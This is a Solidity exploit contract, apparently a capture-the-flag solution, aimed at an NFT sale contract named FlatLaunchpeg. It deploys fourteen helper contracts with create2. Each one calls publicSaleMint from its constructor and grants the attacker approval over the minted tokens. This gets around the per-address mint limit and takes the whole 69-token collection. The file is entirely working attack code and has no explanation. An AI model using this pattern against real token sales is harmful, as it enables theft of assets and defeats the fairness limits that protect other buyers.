// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";

// const collectionSize = 69;
// const maxperaddressduringmint = 5;



contract AttackContract{
    address[] allcontractdeployed;
    constructor(address _attackerAddress, address _FlatLaunchpeg){
        attack(_attackerAddress,_FlatLaunchpeg);
    }

    function getContractBytecode(address _attackerAddress, uint _amount, address _FlatLaunchpeg) internal pure returns (bytes memory) {
        bytes memory bytecode = type(mint).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_attackerAddress,_amount, _FlatLaunchpeg));
    }

    function createContract(uint salt, bytes memory bytecode) internal returns (address contractAddress){
        assembly {
            contractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(contractAddress)) {
                revert(0, 0)
            }
        }
    }


    function attack(address _attackerAddress, address _FlatLaunchpeg) public{
        // 69/5 
        uint lenght = 13;
        uint remainder = 4;
        uint amountTomint = 5;
        //(13*5) + 4 = 69

        bytes memory contractByte =  getContractBytecode(_attackerAddress, amountTomint, _FlatLaunchpeg);

        for(uint256 i=0; i<lenght; i++){    
            allcontractdeployed.push(createContract(i, contractByte));
        }

        allcontractdeployed.push(createContract(13, getContractBytecode(_attackerAddress, remainder, _FlatLaunchpeg)));
    }

    function returnAlladdress() public view returns(address[] memory){
        return allcontractdeployed;
    }

}

contract mint{
     constructor(address _attackerAddress, uint amount, address _FlatLaunchpeg){
        FlatLaunchpeg FlatLaunchpegContract = FlatLaunchpeg(_FlatLaunchpeg);
        FlatLaunchpegContract.publicSaleMint(amount);
        FlatLaunchpegContract.setApprovalForAll(_attackerAddress, true);
    }
}


